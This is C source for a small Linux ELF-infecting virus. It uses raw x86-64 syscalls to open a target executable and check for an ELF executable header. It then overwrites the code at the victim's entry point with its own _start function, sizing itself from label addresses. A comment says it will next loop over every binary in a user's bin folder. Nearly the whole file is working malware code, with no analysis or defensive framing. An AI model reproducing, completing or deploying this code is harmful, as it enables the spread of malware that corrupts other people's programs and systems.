#define SYS_READ	0
#define SYS_WRITE	1
#define SYS_OPEN	2
#define SYS_CLOSE	3
#define SYS_LSEEK	8
#define SYS_EXIT	60
#define _exit(x) 		syscall1(SYS_EXIT, (long)(x))
#define read(fd, buf, len) 	syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
#define write(fd, buf, len) 	syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
#define lseek(fd, offset, origin) 	syscall3(SYS_LSEEK, (long)fd, (long)(offset), (long)origin)
#define open(filename, flags, mode) 	syscall3(SYS_OPEN, \
	       				(long)(filename), (long)flags, (long)mode)
#define close(fd)		syscall1(SYS_CLOSE, fd)

#define O_RDWR		2

#define SEEK_SET	0
#define SEEK_CUR	1
#define SEEK_END	2

/* ELF format start */
#define EI_NIDENT (16)
#define ET_EXEC		2		/* Executable file */
#define PT_LOAD		1		/* Loadable program segment */

typedef unsigned short int	uint16_t;
typedef unsigned int		uint32_t;
typedef int			int32_t;
typedef long int		int64_t;
typedef unsigned long int	uint64_t;

/* Type for a 16-bit quantity.  */
typedef uint16_t Elf64_Half;

/* Types for signed and unsigned 32-bit quantities.  */
typedef uint32_t Elf64_Word;
typedef	int32_t  Elf64_Sword;

/* Types for signed and unsigned 64-bit quantities.  */
typedef uint64_t Elf64_Xword;
typedef	int64_t  Elf64_Sxword;

/* Type of addresses.  */
typedef uint64_t Elf64_Addr;

/* Type of file offsets.  */
typedef uint64_t Elf64_Off;

typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	e_phoff;		/* Program header table file offset */
  Elf64_Off	e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;		/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;		/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */
} Elf64_Ehdr;

typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;

/* ELF format end */

static inline long syscall1(int num, long a1) __attribute__((always_inline));
static inline long syscall1(int num, long a1) 
{
	long ret;
	__asm__ __volatile__ (
		"syscall\n"
		: "=a" (ret) /* output */
		: "a" (num), "D" (a1) /* input */
	        : /* clobered */
	);
	return ret;
}

static inline long syscall3(int num, long a1, long a2, long a3) __attribute__((always_inline));
static inline long syscall3(int num, long a1, long a2, long a3)
{
	long ret;
	__asm__ __volatile__ (
		"syscall\n"
		: "=a" (ret) /* output */
		: "a" (num), "D" (a1), "S" (a2), "d" (a3) /* input */
	        : /* clobered */
	);
	return ret;
}

static inline void memcpy(long src_addr, long dst_addr, long size) __attribute__((always_inline));
static inline void memcpy(long src_addr, long dst_addr, long size)
{
	long x;
	for(x = 0; x <= size; x += 4, src_addr += 4, dst_addr += 4)
	{
		*((long *)dst_addr) = *((long *)src_addr);
	}
}

void _start(void) __attribute__((aligned(8)));

void _start(void)
{
label1: ;
	char a[5];
	volatile Elf64_Ehdr ehdr;
	volatile Elf64_Phdr phdr;
	volatile char buf[4096];
	unsigned long offset;
	unsigned long code_size;
	Elf64_Half p;

	a[0] = 'a';
	a[1] = 'a';
	a[2] = 'a';
	a[3] = 'a';
	a[4] = '\0';

	/* loop: for all elf files in /home/user/bin */
	volatile long fd = open(a, O_RDWR, 0);
	if (fd < 0) {
		_exit(3);
	}
	volatile long n = read(fd, &ehdr, sizeof(ehdr));
	if (ehdr.e_ident[0] != 0x7f
	    || ehdr.e_ident[1] != 'E'
	    || ehdr.e_ident[2] != 'L'
	    || ehdr.e_ident[3] != 'F'
	    || ehdr.e_type != ET_EXEC)
	{
		close(fd);
		_exit(5);
	}

	lseek(fd, ehdr.e_phoff, SEEK_SET);
	for (p = 0; p < ehdr.e_phnum; ++p) {
		read(fd, &phdr, sizeof(phdr));
		if (phdr.p_type != PT_LOAD) { continue; }

		/* _start in victim */
		offset = ehdr.e_entry - phdr.p_vaddr;

		/* Count size of _start function of virus */
		code_size = &&label2 - &&label1;
		lseek(fd, offset, SEEK_SET);
		/* add code */
		memcpy((long)&_start, (long)buf, code_size);
		write(fd, (long)buf, code_size);

		break;
	}	

	close(fd);
	_exit(0);
label2: ;
}